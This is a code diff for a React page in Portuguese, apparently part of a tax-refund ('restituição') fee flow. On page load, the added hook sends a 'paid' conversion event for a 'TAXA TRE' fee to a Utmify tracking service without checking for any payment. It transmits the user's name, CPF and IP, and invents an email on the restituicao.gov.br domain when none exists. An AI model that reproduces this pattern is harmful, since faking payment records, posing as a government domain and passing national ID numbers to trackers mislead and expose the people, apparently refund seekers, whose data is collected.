@@ -10,6 +10,7 @@ import { Badge } from "@/components/ui/badge";
 import { useToast } from "@/hooks/use-toast";
 import ScrollToTop from "@/components/ScrollToTop";
 import { useUserData } from "@/contexts/UserContext";
+import { registerTREPayment } from "@/services/UtmifyService";
 
 // Funções de formatação
 const formatarCPF = (cpf: string) => {
@@ -101,6 +102,41 @@ export default function TaxaComplementar() {
       pagamentoId: userData.pagamentoId || ""
     });
   }, [userData]);
+  
+  // Efeito para registrar o evento de PAID da TRE quando o usuário acessa esta página
+  useEffect(() => {
+    const dispararEventoPagamentoTRE = async () => {
+      try {
+        // Verificar se temos os dados mínimos necessários
+        if (userData.nome && userData.cpf) {
+          console.log('[Utmify] Registrando evento de PAID da TAXA TRE (1/3)');
+          
+          // Montar objeto com dados do usuário
+          const dadosUsuario = {
+            nome: userData.nome,
+            cpf: userData.cpf,
+            email: userData.email || `${userData.cpf.substring(0, 3)}xxx${userData.cpf.substring(userData.cpf.length-2)}@restituicao.gov.br`,
+            telefone: userData.telefone || "(11) 99999-9999",
+            ip: userData.ip || "127.0.0.1"
+          };
+          
+          // Registrar evento de PAID para a TAXA TRE (1/3)
+          const response = await registerTREPayment(dadosUsuario, 'paid', userData.pagamentoId);
+          
+          if (response.success) {
+            console.log('[Utmify] Evento de PAID da TAXA TRE registrado com sucesso:', response.data);
+          } else {
+            console.error('[Utmify] Erro ao registrar evento de PAID da TAXA TRE:', response.error);
+          }
+        }
+      } catch (error) {
+        console.error('[Utmify] Erro ao registrar evento de PAID da TAXA TRE:', error);
+      }
+    };
+    
+    // Executar a função para registrar o pagamento
+    dispararEventoPagamentoTRE();
+  }, [userData]); // Executar apenas uma vez quando os dados do usuário estiverem disponíveis
   
   // Função para prosseguir para a página de pagamento da TCN
   const prosseguirParaPagamentoTCN = () => {
